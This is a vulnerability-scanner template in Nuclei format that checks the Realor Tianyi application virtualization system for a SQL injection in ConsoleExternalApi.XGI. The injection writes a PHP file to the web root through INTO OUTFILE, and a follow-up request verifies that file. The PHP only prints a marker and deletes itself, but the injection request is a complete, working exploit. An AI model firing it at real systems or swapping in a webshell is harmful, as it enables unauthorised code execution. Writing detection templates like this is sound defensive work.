id: gwt-system-consoleexternalapi-xgi-rce
info:
  name: 瑞友天翼应用虚拟化系统 ConsoleExternalApi SQL注入任意写入漏洞
  author: ProjectDiscoveryAI
  severity: critical
  tags: arbitrary-write
  description: |
    瑞友天翼应用虚拟化系统存在一个SQL注入漏洞，允许攻击者通过特制的POST请求将恶意文件写入目标系统，从而实现代码执行。

variables:
  filename: "{{to_lower(rand_base(10))}}"
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

flow: http(1) && http(2)

http:
  - id: post-sqli-write
    method: POST
    path:
      - "/ConsoleExternalApi.XGI?initParams=command_createUser__pwd_1&key=inner&sign=9252fae35ff226ec26c4d1d9566ebbde"
    headers:
      Content-Type: application/json
    body: |
      {
       "account": "1' union select '<?php echo(md5(\"{{t1}}\"));unlink(__FILE__);?>',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL into outfile '..\\\\..\\\\WebRoot\\\\{{filename}}.xgi'#",
       "userPwd": "1"
      }
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "\"result\":0"

  - id: get-file-verification
    method: GET
    path:
      - "/{{filename}}.xgi"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "{{t2}}"
